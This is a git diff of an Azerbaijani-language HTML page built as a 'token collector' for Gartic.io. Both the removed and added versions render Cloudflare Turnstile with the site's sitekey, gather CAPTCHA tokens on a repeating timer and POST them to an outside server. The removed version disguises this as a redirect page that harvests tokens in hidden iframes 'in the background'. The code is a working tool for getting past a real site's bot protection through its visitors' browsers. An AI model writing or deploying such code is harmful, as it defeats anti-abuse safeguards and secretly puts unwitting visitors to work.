@@ -1,123 +1,79 @@
-<!DOCTYPE html>
+l<!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gartic.io</title>
+  <meta charset="UTF-8">
+  <title>Token Toplama Test (Gartic.io)</title>
   <style>
-    body { 
-      margin: 0; 
-      height: 100vh; 
-      background: #000; 
-      color: #fff; 
-      font-family: Arial, sans-serif; 
-      display: flex; 
-      flex-direction: column; 
-      justify-content: center; 
-      align-items: center; 
-      text-align: center; 
-    }
-    h1 { 
-      color: #ff3c3c; 
-      font-size: 4rem; 
-      margin-bottom: 1rem; 
-      text-shadow: 0 0 20px #ff0000; 
-    }
-    p { font-size: 1.5rem; margin: 1rem 0; }
-    .spinner { 
-      border: 8px solid #222; 
-      border-top: 8px solid #ff3c3c; 
-      border-radius: 50%; 
-      width: 60px; 
-      height: 60px; 
-      animation: spin 1s linear infinite; 
-      margin: 2rem 0; 
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    body { margin:0; height:100vh; background:#111; color:#fff; font-family:Arial; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
+    h1 { color:#ff4444; font-size:3rem; }
+    #status { font-size:1.3rem; margin:1rem; color:#ffcc00; }
   </style>
 </head>
 <body>
-
-  <h1>Gartic.io</h1>
-  <p>Sayta keçirilir... Token toplanır (arka planda)</p>
-  <div class="spinner"></div>
+  <h1>Gartic.io Token Toplayıcı</h1>
+  <div id="status">Token axtarılır... (Gartic.io-da CAPTCHA yoxdursa işləməyəcək)</div>
 
   <script>
-    'use strict';
+    const STATUS = document.getElementById('status');
+    const TOKEN_INTERVAL = 8000; // 8 saniyədən bir cəhd (çox tez olmasın)
 
-    const TOKEN_INTERVAL = 5000;      // hər ~5 saniyədən bir yeni token cəhdi
-    const PAGE_REFRESH_INTERVAL = 2 * 60 * 1000;  // 2 dəqiqədən bir yenilə
+    function tryGetToken() {
+      STATUS.textContent = 'Turnstile yüklənir...';
 
-    function createTurnstileFrame() {
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.sandbox = "allow-scripts allow-same-origin";
-        document.body.appendChild(iframe);
+      // Real sitekey tapılmayıb – test üçün ümumi istifadə olunur, amma Gartic.io-da işləmir
+      const sitekey = '0x4AAAAAABBPKaIbNwnPEfSo'; // ← buranı dəyişmək lazımdır (real olarsa)
 
-        const html = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-            </head>
-            <body>
-                <div id="cf-turnstile"></div>
-                <script>
-                    window.onload = function() {
-                        turnstile.render("#cf-turnstile", {
-                            sitekey: "0x4AAAAAABBPKaIbNwnPEfSo",
-                            callback: function(token) {
-                                parent.postMessage(token, "*");
-                            }
-                        });
-                    }
-                </script>
-            </body>
-            </html>
-        `;
+      window.turnstile?.render(document.body, {
+        sitekey: sitekey,
+        appearance: 'always',
+        callback: function(token) {
+          STATUS.textContent = 'Token alındı! Göndərilir...';
+          console.log('Token:', token);
 
-        iframe.srcdoc = html;
+          // Serverə göndər (öz serverini qoy)
+          fetch('https://mesho.alwaysdata.net/add-token', {  // ← buranı öz serverinlə əvəz et
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, url: location.href })
+          })
+          .then(r => r.json())
+          .then(d => { STATUS.textContent = 'Uğurlu! Server cavabı: ' + JSON.stringify(d); })
+          .catch(e => { STATUS.textContent = 'Xəta: ' + e; console.error(e); });
+        },
+        'error-callback': function(err) {
+          STATUS.textContent = 'Xəta: ' + (err || 'Widget yüklənmədi – sitekey yanlış ola bilər');
+          console.error('Turnstile xətası:', err);
+        }
+      });
     }
 
-    window.addEventListener("message", function (event) {
-        const token = event.data;
-        if (typeof token === "string" && token.length > 20) {
-            console.log("Token alındı:", token);
+    // İlk cəhd
+    if (window.turnstile) {
+      tryGetToken();
+    } else {
+      // Turnstile script-i yüklə (əgər səhifədə yoxdursa)
+      const script = document.createElement('script');
+      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';
+      script.async = true;
+      script.defer = true;
+      document.head.appendChild(script);
 
-            fetch("https://mesho.alwaysdata.net/add-token", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ token: token })
-            })
-            .then(res => res.json())
-            .then(data => console.log("Server cavabı:", data))
-            .catch(err => console.error("Token göndərmə xətası:", err));
-        }
+      window.onTurnstileLoad = function () {
+        STATUS.textContent = 'Turnstile hazır – cəhd edilir';
+        tryGetToken();
+      };
+    }
 
-        // İstifadədən sonra bütün iframe-ləri sil (yaddaş sızmasını qarşılamaq üçün)
-        document.querySelectorAll("iframe").forEach(iframe => iframe.remove());
-    });
+    // Təkrar cəhdlər
+    setInterval(() => {
+      if (document.querySelector('.cf-turnstile')) return; // artıq varsa təkrar etmə
+      tryGetToken();
+    }, TOKEN_INTERVAL);
 
-    // Token toplamağı başla
-    setInterval(createTurnstileFrame, TOKEN_INTERVAL);
-    createTurnstileFrame();  // İlk dəfə dərhal başla
-
-    // Səhifəni dondan qorumaq üçün avto-refresh
+    // 10 saniyədən sonra Gartic.io-ya keç (istəyə görə sil bilərsən)
     setTimeout(() => {
-        console.log("Səhifə yenilənir (dondan qorumaq üçün)...");
-        location.reload();
-    }, PAGE_REFRESH_INTERVAL);
-
-    // Dərhal Gartic.io-ya keç
-    window.location.href = "https://gartic.io";
-    
-    // Əgər redirect gecikərsə (nadir hallarda), 3 saniyədən sonra yenidən cəhd
-    setTimeout(() => {
-      window.location.href = "https://gartic.io";
-    }, 3000);
+      window.location.href = 'https://gartic.io';
+    }, 10000);
   </script>
-
 </body>
 </html>
